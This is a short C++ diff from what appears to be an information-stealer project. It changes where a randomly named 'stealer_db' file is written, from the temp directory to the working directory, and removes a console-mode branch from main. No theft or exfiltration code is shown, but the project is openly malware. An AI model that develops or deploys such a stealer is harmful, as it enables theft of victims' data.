@@ -30,8 +30,12 @@ void init_stealer_db()
 		stealer_db += characters[rand() % characters.length()];
 	}
 
-	std::filesystem::path temp_path = std::filesystem::temp_directory_path();
-	stealer_db = temp_path.string() + stealer_db;
+	//std::filesystem::path temp_path = std::filesystem::temp_directory_path();
+	//stealer_db = temp_path.string() + stealer_db;
+
+    //saving stealer db in current working directory instead of temp
+    std::filesystem::path db_path = std::filesystem::current_path();
+    stealer_db = db_path.string() + "\\" + stealer_db + ".db";
 }
 
 int main(int argc, char* argv[])
@@ -51,10 +55,6 @@ int main(int argc, char* argv[])
     if (argc == 1) {
         if (!visualizer.default_settings(converted_username, stealer_db))
             return -1;
-    }
-    else if (std::string(argv[1]) == "-console-mode") {
-        // Console mode visualization
-        visualizer.visualization_main();
     }
     else if (std::string(argv[1]) == "-h") {
         visualizer.displayHelp();
